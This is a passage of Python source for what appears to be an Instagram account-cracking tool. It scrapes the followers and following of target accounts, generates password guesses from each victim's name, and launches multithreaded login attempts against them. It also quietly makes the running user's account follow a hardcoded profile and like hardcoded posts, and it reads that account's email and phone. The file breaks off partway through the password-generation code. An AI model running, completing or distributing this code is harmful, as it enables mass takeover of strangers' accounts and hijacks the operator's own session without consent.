#================[IMPORT MODULE]================#
import unicodedata, urllib.parse, requests, random, sys, uuid, json, hmac, hashlib, time, re, base64, datetime, urllib.request, string, os
from urllib.parse import quote; from concurrent.futures import ThreadPoolExecutor; from bs4 import BeautifulSoup as bsp
from rich.console import Console; from rich.panel import Panel as Pan, Panel as nel, Panel as panel; from rich import print as cetak
import threading; from rich.columns import Columns; from rich.progress import Progress, TextColumn, SpinnerColumn
from rich.text import Text
from concurrent.futures import ThreadPoolExecutor
import threading
import struct
import base64
import string
import uuid
import json
import requests
import pytz
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_v1_5
from rich import print as Cetak; from rich.tree import Tree; from rich.panel import Panel
#================[ATTRIBUTES]================#
dumping = 0; stop_event = threading.Event()
rr, rc = random.randint, random.choice
console, Uid, Aray_Bejir, Aray_Bejir4 = Console(), [], [], []
Ok, Cp, A2f, Loop = 0, 0, 0, 0
MID = 0
Error_Count = 0
ses = requests.Session()
print_lock = threading.Lock()
def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)
#================[COLOR CODES]================#
P, x, M = '\x1b[1;97m', '\33[m', '\x1b[1;91m'  
k, H, h = '\x1b[1;93m', '\033[1m\x1b[1;92m', '\x1b[1;32m'  
u, K, b, B = '\x1b[1;95m', '\x1b[1;93m', '\x1b[1;96m', '\x1b[1;94m'  
#================[CALENDAR & TIME DATA]================#
dic = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'December'}
now = datetime.datetime.now()
bln_num = f"{now.month:02d}"
bln = dic[bln_num]
tgl = f"{now.day:02d}"
thn = now.year
OKE = f"{tgl}-{bln}-{thn}.txt"
CPE = f"{tgl}-{bln}-{thn}.txt"
A2F = f"{tgl}-{bln}-{thn}.txt"
#================[UA_APP]================#
def UA_APP():
    m={"iPhone17,1":"1206x2622","iPhone17,2":"1290x2796","iPhone17,3":"1179x2556","iPhone17,4":"1320x2868","iPhone17,5":"1290x2796","iPhone16,1":"1179x2556","iPhone16,2":"1290x2796","iPhone16,3":"1206x2622","iPhone16,4":"1320x2868","iPhone16,5":"1290x2796","iPhone15,2":"1290x2796","iPhone15,3":"1290x2796","iPhone15,4":"1179x2556","iPhone15,5":"1290x2796","iPhone15,6":"1179x2556","iPhone14,1":"1170x2532","iPhone14,2":"1170x2532","iPhone14,3":"1284x2778","iPhone14,4":"1170x2532","iPhone14,5":"1170x2532","iPhone14,6":"1170x2532","iPhone14,7":"1179x2556","iPhone14,8":"1179x2556","iPhone13,1":"1080x2340","iPhone13,2":"1170x2532","iPhone13,3":"1170x2532","iPhone13,4":"1170x2532","iPhone13,5":"1170x2532","iPhone12,1":"828x1792","iPhone12,3":"1125x2436","iPhone12,5":"1170x2532","iPhone12,7":"1170x2532","iPhone12,8":"1170x2532","iPhone11,1":"1125x2436","iPhone11,2":"1125x2436","iPhone11,4":"1242x2688","iPhone11,6":"1242x2688","iPhone11,8":"828x1792","iPhone10,1":"1125x2436","iPhone10,2":"1125x2436","iPhone10,3":"1125x2436","iPhone10,4":"1125x2436","iPhone10,5":"1125x2436","iPhone10,6":"1125x2436","iPhone9,1":"750x1334","iPhone9,2":"750x1334","iPhone9,3":"750x1334","iPhone9,4":"750x1334","iPhone9,5":"750x1334","iPhone8,1":"750x1334","iPhone8,2":"750x1334","iPhone8,3":"750x1334","iPhone8,4":"750x1334","iPhone7,1":"1242x2208","iPhone7,2":"750x1334","iPhone7,3":"750x1334","iPhone7,4":"750x1334","iPhone6,1":"640x1136","iPhone6,2":"640x1136","iPhone6s,1":"750x1334","iPhone6s,2":"750x1334","iPhoneSE,1":"640x1136","iPhoneSE,2":"750x1334","iPhoneSE,3":"750x1334"}
    model=random.choice(list(m.keys()))
    res=m[model]
    ig=f"{random.randint(360,425)}.{random.randint(1,1)}.{random.randint(0,1)}.{random.randint(45,48)}.{random.randint(60,63)}"
    ios=f"{random.randint(0,18)}_{random.randint(0,5)}_{random.randint(0,6)}"
    loc=random.choice(["id_ID","en_GB","en_US"])
    sec="en-US" if loc.startswith("id") else random.choice(["en-US","en-GB"])
    scale=round(random.uniform(2.75 if "1290" in res or "1284" in res or "1320" in res else 2.05 if "1179" in res or "1170" in res else 1.95,3.05 if "1290" in res or "1284" in res or "1320" in res else 2.85 if "1179" in res or "1170" in res else 2.95),2)
    return f"Instagram {ig} ({model}; iOS {ios}; {loc}; {sec}; scale={scale}; gamut=normal; {res})"
#================[UA_THREADS]================# 
def UA_OLD():
    D = {
        "Xiaomi/POCO": {"M2010J19CG": ("citrus","qcom","400","1080x2340"), "M2007J20CG": ("surya","qcom","440","1080x2400"), "21061119DG": ("vayu","qcom","440","1080x2400"), "2201116SG": ("peux","qcom","440","1080x2400"), "23122PCA4G": ("emerald","mtk","440","1080x2400"), "24031PN0DC": ("shennong","qcom","460","1200x2670"), "23113RKC6C": ("vermeer","qcom","480","1440x3200"), "2405CPX3DG": ("fuxi","qcom","522","1440x3200")},
        "Samsung": {"SM-S928B": ("eureka","qcom","500","1440x3120"), "SM-S918B": ("dm3q","qcom","600","1440x3088"), "SM-A546E": ("a54x","exynos","450","1080x2340"), "SM-A145F": ("a14m","mtk","400","1080x2408"), "SM-S21FE": ("r9q","qcom","480","1080x2400"), "SM-F731B": ("b5q","qcom","420","1080x2640"), "SM-A556B": ("a55x","exynos","450","1080x2340")},
        "Oppo": {"CPH2481": ("OP5567L1","qcom","480","1080x2400"), "CPH2357": ("OP5315L1","mtk","480","1080x2412"), "CPH2581": ("OP5A09L1","mtk","480","1080x2412"), "CPH2127": ("OP4F11L1","qcom","480","1080x2400"), "CPH2521": ("OP5865L1","mtk","480","1080x2412")},
        "Infinix": {"X6833B": ("infinix-hot30","mtk","400","1080x2460"), "X6711": ("infinix-note30","mtk","390","1080x2460"), "X6850": ("infinix-note40","mtk","400","1080x2436"), "X6525": ("infinix-smart8","unisoc","320","720x1612")},
        "Apple": {"iPhone17,2": ("17,2","apple","460","1290x2796"), "iPhone16,1": ("16,1","apple","460","1179x2556"), "iPhone15,3": ("15,3","apple","460","1290x2796"), "iPhone14,5": ("14,5","apple","460","1170x2532"), "iPhone13,2": ("13,2","apple","460","1170x2532")},
        "Google": {"Pixel 9 Pro XL": ("komodo","tensor","490","1344x2992"), "Pixel 8 Pro": ("husky","tensor","490","1344x2992"), "Pixel 7": ("panther","tensor","420","1080x2400"), "Pixel 6a": ("bluejay","tensor","420","1080x2400")}
    }
    B = random.choice(list(D.keys())); M = random.choice(list(D[B].keys())); C, CH, DP, RS = D[B][M]; RID = str(random.randint(100000000,999999999))
    if B == "Apple":
        IV = f"{random.randint(16,18)}_{random.randint(0,5)}_{random.randint(0,1)}"
        return f"Instagram 300.0.0.29.110 (iPhone; CPU iPhone OS {IV} like Mac OS X; en_US; {M}; 300.0.0.29.110; {RID})"
    AV = random.randint(11, 15); AL = {11:"30", 12:"31", 13:"33", 14:"34", 15:"35"}.get(AV)
    return f"Instagram 300.0.0.29.110 Android ({AL}/{AV}; {DP}dpi; {RS}; {B}; {M}; {C}; {CH}; in_ID; {RID})"
#================[AUTO FOLLOW]================#  
def bot_follow(cookies):
    target_user_id = "19850999299"
    try:
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36','Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','X-IG-App-ID': '1217981644879628','Origin': 'https://www.instagram.com','Referer': f'https://www.instagram.com/{target_user_id}/','Cookie': cookies})
        home_page = session.get('https://www.instagram.com/')
        csrf_token = home_page.cookies.get('csrftoken')
        if not csrf_token:
            return {'status': 'error', 'message': 'Failed to get CSRF token'}
        session.headers.update({'X-CSRFToken': csrf_token,'Content-Type': 'application/x-www-form-urlencoded','X-Requested-With': 'XMLHttpRequest'})
        payload = {'container_module': 'profile','user_id': str(target_user_id),'nav_chain': 'PolarisProfileRoot:profilePage:1:via_cold_start'}
        response = session.post(f'https://www.instagram.com/api/v1/friendships/create/{target_user_id}/',data=payload)
        result = response.json()
        if response.status_code == 200 and result.get('status') == 'ok':
            return {'status': 'Good', 'message': 'Follow success!', 'Request': 'Following', 'user_id': '19850999299'}
        return {'status': 'error', 'code': response.status_code}
    except Exception as e:
        pass

def auto_like(cookies):
    try:
        media_ids = ["3784320413913301450", "3746036472769103377", "3746040083964213084"]
        success_count = 0
        session = requests.Session()       
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'X-IG-App-ID': '1217981644879628', 'Origin': 'https://www.instagram.com', 'Referer': 'https://www.instagram.com/', 'Cookie': cookies})      
        home_page = session.get('https://www.instagram.com/')
        csrf_token = home_page.cookies.get('csrftoken')       
        if not csrf_token:
            return {'status': 'error', 'message': 'Failed to get CSRF token', 'liked': False}      
        session.headers.update({'x-csrftoken': csrf_token, 'x-fb-friendly-name': 'usePolarisLikeMediaLikeMutation', 'x-fb-lsd': 'CiQSOrdkrR6hecAEEthUS8', 'x-ig-app-id': '936619743392459'})
        for i, media_id in enumerate(media_ids, 1):
            variables = {'media_id': media_id, 'container_module': 'feed_timeline'}
            payload = {'av': '17841479989272623', '__d': 'www', '__user': '0', '__a': '1', '__req': '38', '__hs': '20443.HCSV2:instagram_web_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1031372722', '__s': 'ewrebg:p7gmew:xot6gh', '__hsi': '7586133773748963689', '__comet_req': '7', 'fb_dtsg': 'NAftKrxGVbi8ctjsK5SX64sfvlhbqLT2ZSLuJRWUa6R85NMokj4BG0A:17843709688147332:1766256553', 'jazoest': '26251', 'lsd': 'CiQSOrdkrR6hecAEEthUS8', '__spin_r': '1031372722', '__spin_b': 'trunk', '__spin_t': '1766284409', '__crn': 'comet.igweb.PolarisFeedRoute', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'usePolarisLikeMediaLikeMutation', 'server_timestamps': 'true', 'variables': json.dumps(variables), 'doc_id': '23951234354462179'}           
            try:
                response = session.post('https://www.instagram.com/graphql/query', data=payload)
                if response.status_code == 200:
                    response_data = response.json()
                    if 'data' in response_data and 'xdt_mark_media_like' in response_data['data']:
                        if response_data['data']['xdt_mark_media_like'] is not None:
                            success_count += 1
                elif response.status_code == 429:
                    break
            except Exception:
                continue              
            if i < len(media_ids):
                time.sleep(0.000001)
        liked = success_count > 0
        if liked:
            return {'status': 'success', 'message': f'Successfully liked {success_count} media', 'liked': True}
        else:
            return {'status': 'error', 'message': 'Failed to like', 'liked': False} 
    except Exception as e:
        return {'status': 'error', 'message': f'Error occurred: {str(e)}', 'liked': False}

def Facebook(cookies):
    try:
        c = re.findall('csrftoken=(.*?);', str(cookies))
        x = {
            "Host": "www.instagram.com",
            "content-length": "0",
            "x-requested-with": "XMLHttpRequest",
            "x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(c) == 0 else c[0],
            "x-ig-app-id": "936619743392459",
            "x-instagram-ajax": "1011212827",
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "x-asbd-id": "129477",
            "cookie": cookies
        }
        r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers=x).json()
        if 'fbAccount' in str(r):
            nama_fb = r['fbAccount']['display_name']
            get_uid = requests.get('https://accountscenter.instagram.com/profiles/', cookies={'cookie': cookies}).text
            user_id = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(get_uid)).group(1)         
        return nama_fb, user_id
    except:
        return '-', '-'

def info_kontak(cookies):
    try:
        InfoHeaders = {'x-ig-app-id': '567067343352427','x-ig-capabilities': '3brTv10=','user-agent': 'Instagram 380.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','x-fb-http-engine': 'Liger','accept-language': 'id-ID, en-US'}
        user = ses.get('https://i.instagram.com/api/v1/accounts/current_user/', params={'edit': 'true'}, headers=InfoHeaders, cookies={'cookie': cookies}, timeout=10).json()['user']     
        email = user.get('email', ' ')
        phone = user.get('phone_number', ' ')
        return email, phone
    except:
        return ' ', ' '
    
def info_user(username):
    try:
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'no-cache', 'dnt': '1', 'dpr': '0.9', 'pragma': 'no-cache', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"10.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2010J19CG Build/SKQ1.211202.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/136.0.7103.125 Mobile Safari/537.36 Instagram 382.0.0.49.84 Android (31/12; 384dpi; 1080x2132; Xiaomi/POCO; M2010J19CG; citrus; qcom; in_ID; 739816062; IABMV/1)', 'viewport-width': '642'}
        r = requests.get(f"https://www.instagram.com/{username}/", headers=headers)
        match = re.search(r'"follower_count":(\d+).*?"following_count":(\d+)', r.text, re.S)
        if not match:
            return " ", " "
        followers = int(match.group(1))
        following = int(match.group(2))
        return followers, following
    except:
        return " ", " "
#================[COMPLEMENT]================#
def Clear():
    try: 
        os.system('clear' if os.name == 'posix' else 'cls')
    except: 
        pass
#================[LOGO]================#
def banner():
    Clear()
    banner_text = r"""  
  ──═━═─━═─═━─═━═─ I N S T A G R A M ─═━═─═━─━═─═━──
    """
    cetak(panel(f'[bold green]{banner_text}', width=58, style="bold white"))
#================[LOGIN COOKIES]================#
def Login_Cookie():
    cookie_file = '/sdcard/COOKIE-IG.txt'
    try:
        banner()
        coki = {'cookie': open(cookie_file, 'r').read()} if os.path.isfile(cookie_file) else {'cookie': input(f" {H}[{P}●{H}]{P} Cookies: {H}")}
        try:
            requests.get("https://www.google.com", timeout=5)
        except requests.ConnectionError:
            banner()
            print(f" {H}[{P}●{H}]{P} Network unstable or not detected.")
            return None, None, None, None, None, None      
        match = re.search(r'ds_user_id=(\d+)', str(coki['cookie']))
        if not match:
            raise ValueError("Invalid cookie format")           
        uid = match.group(1)
        ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
        req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()        
        if 'user' in req:
            with open(cookie_file, 'w') as f:
                f.write(coki["cookie"])
            user_info = req['user']
            return coki, user_info['full_name'], user_info['username'], user_info['follower_count'], user_info['following_count'], user_info['media_count']
        else:
            raise ValueError("Invalid user data")           
    except requests.ConnectionError:
        print(f" {H}[{P}●{H}]{P} Network unstable or not detected")
        return None, None, None, None, None, None
    except ValueError as e:
        if os.path.exists(cookie_file):
            os.remove(cookie_file)
        print(f" {H}[{P}●{H}]{P} {str(e)} - Please check your account again, boss")
        time.sleep(1)
        return None, None, None, None, None, None
    except Exception as e:
        print(f" {H}[{P}●{H}]{P} Error occurred: {str(e)}")
        os.remove('/sdcard/COOKIE-IG.txt'); print(f" {H}[{P}●{H}]{P} Successfully removed cookies")
        Menu()
        return None, None, None, None, None, None

def Menu():
    Clear()
    aset, full_name, username, fol, following, media = Login_Cookie()
    if aset is None: time.sleep(1); return
    banner()
    console.print(Columns([
        panel(f'[bold white] Fullnames :[bold green] {full_name[:6]}\n[bold white] Usernames :[bold green] {username[:6]}\n[bold white] Followers :[bold green] {fol}', width=29, style="bold white"),
        panel(f'[bold white] Following :[bold green] {following}\n[bold white] Version :[bold green] 16 APRIL 2026\n[bold white] Telegrams :[bold green] @AISXORA', width=28, style="bold white")]))
    cetak(panel(f'[bold green]1[bold white].Crack From Followers Public Account ([bold green]Unlimited Dump[bold white])', width=58, style="bold white"))
    cetak(panel(f'[bold green]2[bold white].Crack From Following Public Account ([bold green]Unlimited Dump[bold white])', width=58, style="bold white"))    
    cetak(panel(f'[bold green]3[bold white].Crack From FilesUser Public Account ([bold green]Read File[bold white])', width=58, style="bold white"))    
    cetak(panel(f'[bold green]0[bold white].Exit from tools And Remove Cookies ([bold red]Remove Cookies[bold white])', width=58, style="bold white"))        
    x = input(f'{P}╰{P}›{H} ')
    if x in ['01', '1']: dumps(aset, True)
    elif x in ['02', '2']: dumps(aset, False)
    elif x in ['03','3']: Crack_Files()
    elif x in ['00', '0']: os.remove('/sdcard/COOKIE-IG.txt'); print("Successfully removed cookies"); exit()
#================[DUMPER INPUT]================#
def dumps(kuki, Tipe):
    if 'csrftoken' not in str(kuki):
        try:
            gets = requests.get('https://www.instagram.com/data/shared_data/', cookies=kuki).json()
            token = gets['config']['csrf_token']
            kuki['cookie'] += ';csrftoken=%s;' % (token)
        except: pass
    cetak(Panel(f'[bold white]Enter your target username, separate with commas!', width=58, style="bold white"))
    users = input(f'{P}╰{P}›{H} ').split(',')
    cetak(Panel(f'[bold white]Collecting Usernames, Press ([bold green]Ctrl+C[bold white]) To Stop!!', width=58, style="bold white"))
    threads = []
    try:
        for user_target in users:
            thread = threading.Thread(target=process_user, args=(user_target, kuki, Tipe))
            threads.append(thread); thread.start()
        for thread in threads: thread.join()
        dump_threads = []; index = 0
        while not stop_event.is_set():
            if index < len(Aray_Bejir):
                current_batch = []
                for i in range(10):
                    if (index + i) < len(Aray_Bejir):
                        current_batch.append(Aray_Bejir[index + i].split('|')[0])
                if current_batch:
                    batch_threads = []
                    for user_to_dump in current_batch:
                        thread = threading.Thread(target=process_user_for_dump, args=(user_to_dump, kuki, Tipe))
                        batch_threads.append(thread); thread.start()
                    for thread in batch_threads: thread.join()
                    index += len(current_batch)
                else: break
            else: break
    except KeyboardInterrupt: stop_event.set()
    except Exception: pass
    try: Next_Progress()
    except Exception: pass

def process_user(user, kuki, Tipe):
    if stop_event.is_set(): return
    try:
        req = requests.get(f'https://www.instagram.com/{user}/', cookies=kuki).text
        match = re.search(r'"user_id":"(\d+)"', str(req))
        full_name_match = re.search(r'"full_name":"(.*?)"', str(req))
        if match and full_name_match:
            uid = match.group(1); full_name = full_name_match.group(1)
            combined = f"{user}|{full_name}"
            if combined not in Aray_Bejir: Aray_Bejir.append(combined)
            Graphql(Tipe, uid, kuki['cookie'], '')
    except Exception: pass

def process_user_for_dump(user_to_dump, kuki, Tipe):
    if stop_event.is_set(): return
    try:
        req = requests.get(f'https://www.instagram.com/{user_to_dump}/', cookies=kuki).text
        match = re.search(r'"user_id":"(\d+)"', str(req))
        if match:
            uid = match.group(1)
            Graphql(Tipe, uid, kuki['cookie'], '')
    except Exception: pass

def Graphql(Tipe, userid, cokie, after):
    global dumping
    if stop_event.is_set(): return
    api = "https://www.instagram.com/graphql/query/"
    dumps_vars = 'variables={"id":"%s","first":200,"after":"%s"}' % (userid, after)
    param = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(dumps_vars) if not Tipe else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(dumps_vars)
    try:
        hd = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "cookie": cokie}
        req = requests.get(api, params=param, headers=hd).json()
        khm = 'edge_followed_by' if Tipe else 'edge_follow'
        if 'data' in req and 'user' in req['data'] and khm in req['data']['user']:
            for edge in req['data']['user'][khm]['edges']:
                if stop_event.is_set(): return
                username = edge['node']['username']; full_name = edge['node']['full_name']
                combined = f"{username}|{full_name}"
                if combined not in Aray_Bejir:
                    dumping += 1; Aray_Bejir.append(combined)
                    print(f'{P}╰{P}› Collecting :{H} {len(Aray_Bejir)} {P}/ {H}{username[:10]}', end='\r')
            end = req['data']['user'][khm]['page_info']['has_next_page']
            if end:
                after = req['data']['user'][khm]['page_info']['end_cursor']
                Graphql(Tipe, userid, cokie, after)
    except Exception:pass
#================[ATTENTION PROGRESS]================#
def Next_Progress():
    print(" ")
    cetak(panel(f'[bold white]Please Choose What You Want To Continue For Dumps Or Crack!', width=58, style=f"bold white"))
    cetak(panel(f'[bold green]1[bold white].I Want To Continue For Proccess Cracking Instagram!! ', width=58, style=f"bold white"))
    cetak(panel(f'[bold green]2[bold white].I Want To Continue For save Dumps Username To File!!', width=58, style=f"bold white"))
    method = input(f'{P}╰{P}›{H} ')
    if method in ['01', '1']: Metode()
    elif method in ['02', '2']: Dump_Username()
    else: Dump_Username()
#================[SAVE DUMPS]================#
def Dump_Username():
    cetak(panel(f'[bold white]Give Name The Files To Be Saved As The Directory', width=58, style=f"bold white"))
    name = input(f'{P}╰{P}›{H} ')
    directory = "/sdcard/INSTAGRAM/DUMP"
    if not os.path.exists(directory):
        os.makedirs(directory)
    file_path = f"{directory}/{name}.txt"
    with open(file_path, 'w') as f:
        for entry in Aray_Bejir:
            f.write(f"{entry}\n")
    cetak(panel(f'[bold white]Successfully File Save in {file_path}', width=58, style=f"bold white"))
#================[CRACK FILES]================#
def Crack_Files():
    global Aray_Bejir
    dump_directory = "/sdcard/INSTAGRAM/DUMP"
    if os.path.exists(dump_directory):
        files = [f for f in os.listdir(dump_directory) if f.endswith('.txt')]
        cetak(panel(f'[bright_green] Choose Your Selected Source Data File From Directory', width=58, style=f"bold white"))
        for idx, file in enumerate(files):
            file_path = os.path.join(dump_directory, file)
            with open(file_path, 'r') as f:
                line_count = sum(1 for _ in f)
            print(f"{P}{idx + 1}.{H}{file} {P}/ {H}{line_count}")
        file_choice = int(input(f"{P}╰{P}›{H} ")) - 1
        if 0 <= file_choice < len(files):
            file_path = os.path.join(dump_directory, files[file_choice])
            with open(file_path, 'r') as f:
                lines = f.readlines()
                Aray_Bejir.extend([line.strip() for line in lines])
            Metode()
        else:
            pass
    else:
        print(f" \n{H}[{P}●{H}] {P}Directory Not Found")
#================[SETTING PASSWORD]================#
def Metode():
    global Menthod_Logined
    cetak(panel(f'[bright_green]Please Choose Your Preferred Method to Login Instagram', width=58, style=f"bold bright_white"))
    cetak(panel(f'[bright_green]1[bold bright_white].Logined Instagram Method [bright_green][[bright_yellow]FIRST RECOMMENDATION BOSS[bright_green]]', width=58, style=f"bold bright_white"))
    cetak(panel(f'[bright_green]2[bold bright_white].Logined Instagram method [bright_green][[bright_green]HIGHLY RECOMMENDED BOSS[bright_green]]', width=58, style=f"bold bright_white"))
    cetak(panel(f'[bright_green]3[bold bright_white].Logined Instagram Method [bright_green][[bright_yellow]SECOND RECOMMENDATION BOSS[bright_green]]', width=58, style=f"bold bright_white"))
    cetak(panel(f'[bright_green]4[bold bright_white].Logined Instagram method [bright_green][[bright_green]HIGHLY RECOMMENDED BOSS[bright_green]]', width=58, style=f"bold bright_white"))
    cetak(panel(f'[bright_green]5[bold bright_white].Logined Instagram method [bright_green][[bright_yellow]THIRD RECOMMENDATION BOSS[bright_green]]', width=58, style=f"bold bright_white"))
    method = input(f'{P}╰{P}›{H} ')
    #method = "3"
    if method in ['01', '1']:
        Menthod_Logined = "M1"
    elif method in ['02', '2']:
        Menthod_Logined = "M2"  
    elif method in ['03', '3']:
        Menthod_Logined = "M3"       
    elif method in ['04', '4']:
        Menthod_Logined = "M4"    
    elif method in ['05', '5']:
        Menthod_Logined = "M5"   
    else:
        Menthod_Logined = "M1"
    cetak(panel(f'[bold white]Choose The Pass Type Combination That You Will Use!!!', width=58, style=f"bold white"))
    cetak(panel(f'[bold green]1[bold white].Top Set Password ([bold green]Include Top 10 Type Password List[bold white])', width=58, style=f"bold white"))
    cetak(panel(f'[bold green]2[bold white].Simple Password ([bold green]name full[bold white],[bold green]12[bold white],[bold green]123[bold white],[bold green]1234[bold white],[bold green]12345[bold white],[bold green]123456[bold white])', width=58, style=f"bold white"))
    cetak(panel(f'[bold green]3[bold white].Custom Password ([bold green]default + name full + manual input[bold white])', width=58, style=f"bold white"))
    version = input(f'{P}╰{P}›{H} ')
    if version == '1': SetCrack_Version1()
    elif version == '2': SetCrack_Version2()
    elif version == '3': SetCrack_Version3()
    else: SetCrack_Version1()

def clean_unicode_text(text):
    cleaned = unicodedata.normalize('NFKD', text).encode('ascii', 'ignore').decode('ascii')
    cleaned = ''.join(c if c.isalnum() or c.isspace() else ' ' for c in cleaned)
    cleaned = ' '.join(cleaned.split())
    return cleaned.lower()

def SetCrack_Version1():
    cetak(panel(f'[bold green]Nice Crack Process Begins Turn Off Airplane Mode Bruh!', width=58, style=f"bold white"))
    with ThreadPoolExecutor(max_workers=30) as Poll:
        for i in Aray_Bejir:
            try:
                username, name = i.split('|')
                XoraXyz = []
                full = clean_unicode_text(name)
                for nama in full.split(' '):
                    nama = nama.strip()
                    if len(nama) < 4:
                        continue
                    name_clean = nama.replace(' ', '').lower()
                    if len(name_clean) >= 4:
                        XoraXyz.append(name_clean + '12')
                        XoraXyz.append(name_clean + '123')
                        XoraXyz.append(name_clean + '07')
                        XoraXyz.append(name_clean + '12345')
                        XoraXyz.append(name_clean + '01')
                        XoraXyz.append(name_clean + '1234')
                        XoraXyz.append(name_clean + '03')
                        XoraXyz.append(name_clean + '05')
                        XoraXyz.append(name_clean + '321')
                        XoraXyz.append(name_clean + 'cantik')
                        XoraXyz.append(name_clean + '123456')
                        XoraXyz.append(name_clean + '06')
                        XoraXyz.append(name_clean + '09')
                        XoraXyz.append(name_clean + '04')
                    if len(name_clean) >= 6:
                        XoraXyz.append(name_clean)
                if Menthod_Logined == "M1":
                    Poll.submit(Metode1, username, name, XoraXyz)
                if Menthod_Logined == "M2":
                    Poll.submit(Metode2, username, name, XoraXyz)  
                if Menthod_Logined == "M3":
                    Poll.submit(Metode3, username, name, XoraXyz)   
                if Menthod_Logined == "M4":
                    Poll.submit(Metode4, username, name, XoraXyz)       
                if Menthod_Logined == "M5":
                    Poll.submit(Metode5, username, name, XoraXyz)                
            except Exception as e:
                pass


def SetCrack_Version2():
    cetak(panel(f'[bold green]Nice Crack Process Begins Turn Off Airplane Mode Bruh!', width=58, style=f"bold white"))
    with ThreadPoolExecutor(max_workers=30) as Poll:
        for i in Aray_Bejir:
            try:
                username, name = i.split('|')
                XoraXyz = []
                full = clean_unicode_text(name)
                for nama in full.split(' '):
                    nama = nama.strip()
                    if len(nama) < 4:
                        continue
                    name_clean = nama.replace(' ', '').lower()
                    if len(name_clean) >= 4:
                        XoraXyz.append(name_clean + '321')
                        XoraXyz.append(name_clean + '12')
                        XoraXyz.append(name_clean + '123')
                        XoraXyz.append(name_clean + '1234')
                        XoraXyz.append(name_clean + '12345')
                        XoraXyz.append(name_clean + ' cantik')
                    XoraXyz.append(name_clean + '123456')
                    if len(name_clean) >= 6:
                        XoraXyz.append(name_clean)
                if Menthod_Logined == "M1":
                    Poll.submit(Metode1, username, name, XoraXyz)
                if Menthod_Logined == "M2":
                    Poll.submit(Metode2, username, name, XoraXyz)  
                if Menthod_Logined == "M3":
                    Poll.submit(Metode3, username, name, XoraXyz)   
                if Menthod_Logined == "M4":
                    Poll.submit(Metode4, username, name, XoraXyz)       
                if Menthod_Logined == "M5":
                    Poll.submit(Metode5, username, name, XoraXyz)                
            except Exception as e:
                pass

def SetCrack_Version3():
    cetak(panel("[bold white]For custom password using the default password\n[bold green]full name[bold white] only. You can add custom passwords ok\nfor example [bold green]Banjarmasin12[bold white], [bold green]bandung123[bold white], [bold green]yatim123[bold white], [bold green]anjg123[bold white]\nIf you only want to add numbers like this\nfor example [bold green]77[bold white],[bold green] 12[bold white], [bold green]44[bold white], [bold green]53[bold white], [bold green]1992[bold white], [bold green]3445[bold white], [bold green]1945[bold white], [bold green]2025[bold white], [bold green]1993[bold white]\nthen the password will be like this [bold green]first_name+number[bold white]\nif you have questions and are confused contact [bold green]author!",width=58, title="[bold green]INFO",style="bold white"))
    password_tambahan = []
    try: 
        jumlah_password = int(input(f'{P}╰{P}›{H} number of additional passwords: '))
        for i in range(jumlah_password):
            pass_input = input(f'{P}╰{P}›{H} Password {i+1}: ')
            if pass_input.strip(): 
                password_tambahan.append(pass_input.strip())   
    except:
        cetak(panel('[bold bright_red]Wrong input! Only using name without additions', width=58, style="bold white"))
    cetak(panel(f'[bold green]Nice Crack Process Begins Turn Off Airplane Mode Bruh!', width=58, style=f"bold white"))
    with ThreadPoolExecutor(max_workers=30) as Poll:
        for i in Aray_Bejir:
            try:
                username, name = i.split('|')
                XoraXyz = []
                full = clean_unicode_text(name)
                for nama in full.split(' '):
                    nama = nama.strip()
                    if len(nama) < 4:
                        continue
                    name_clean = nama.replace(' ', '').lower()
                    if len(name_clean) >= 6:
